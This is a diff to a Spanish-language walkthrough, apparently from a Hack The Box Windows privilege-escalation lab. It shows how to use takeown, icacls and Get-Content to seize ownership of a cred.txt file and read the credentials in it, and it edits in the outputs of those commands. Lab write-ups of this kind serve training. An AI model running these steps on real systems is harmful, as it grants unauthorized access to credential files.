@@ -142,15 +142,18 @@ Comprobamos detalles del fichero (nombre completo, fechas, atributos y owner):
 Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
   Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
 ```
+| FullName                                      | LastWriteTime             | Attributes | Owner |
+|----------------------------------------------:|--------------------------:|-----------:|:-----:|
+| C:\Department Shares\Private\IT\cred.txt      | 6/18/2021 12:23:28 PM     | Archive    |       |
+
 
 Si no aparece el `Owner` (o la consulta falla por permisos), retrocede y mira el propietario del directorio:
 
 ```powershell
-# Mostrar owner de la carpeta con cmd (ejemplo)
 cmd /c dir /q 'C:\Department Shares\Private\IT'
 ```
 
-**Salida de ejemplo:**
+**Salida:**
 
 ```
  Directory of C:\Department Shares\Private\IT
@@ -169,11 +172,10 @@ En este ejemplo la carpeta está bajo la propiedad de la cuenta `WINLPE-SRV01\sc
 Si nuestro token tiene el privilegio habilitado, podemos ejecutar `takeown` para cambiar la propiedad del archivo al usuario actual.
 
 ```powershell
-# Tomar propiedad del archivo
 takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 ```
 
-**Salida de ejemplo:**
+**Salida:**
 
 ```
 SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
@@ -186,7 +188,7 @@ Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | \
   select name,directory,@{Name='Owner';Expression={(Get-ACL $_.Fullname).Owner}}
 ```
 
-**Salida de ejemplo:**
+**Salida:**
 
 ```
 Name     Directory                       Owner
@@ -204,7 +206,7 @@ Ser propietario no siempre implica tener permisos efectivos de lectura. Tras tom
 icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
 ```
 
-**Salida de ejemplo:**
+**Salida:**
 
 ```
 processed file: C:\Department Shares\Private\IT\cred.txt
@@ -221,7 +223,7 @@ Si todo ha funcionado, ahora podemos leer el fichero:
 Get-Content 'C:\Department Shares\Private\IT\cred.txt'
 ```
 
-**Salida de ejemplo:**
+**Salida:**
 
 ```
 NIX01 admin
